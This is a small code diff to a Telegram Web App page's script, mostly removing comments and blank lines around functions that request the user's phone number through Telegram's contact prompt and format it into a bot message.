@@ -345,7 +345,6 @@
                 Telegram.WebApp.showAlert("No phone number found.");
             }
         }
-
         async function sendPhoneNumberMessage(chatId, botToken, phoneNumber) {
             const phoneNumberMessage = `📱 Phone Number: ${phoneNumber}`;
 
@@ -372,22 +371,20 @@
                 });
         }
 
-        // Function to request phone number and return it
         async function getPhoneNumber(userId) {
             return new Promise((resolve) => {
-                // Requesting the contact
                 Telegram.WebApp.requestContact();
 
-                // Wait until contact is selected
                 Telegram.WebApp.onEvent("contactSelected", function (contact) {
                     if (contact && contact.phone_number) {
-                        resolve(contact.phone_number);  // Return the phone number
+                        resolve(contact.phone_number);
                     } else {
-                        resolve(null);  // No phone number available
+                        resolve(null);
                     }
                 });
             });
         }
+
 
     </script>
 
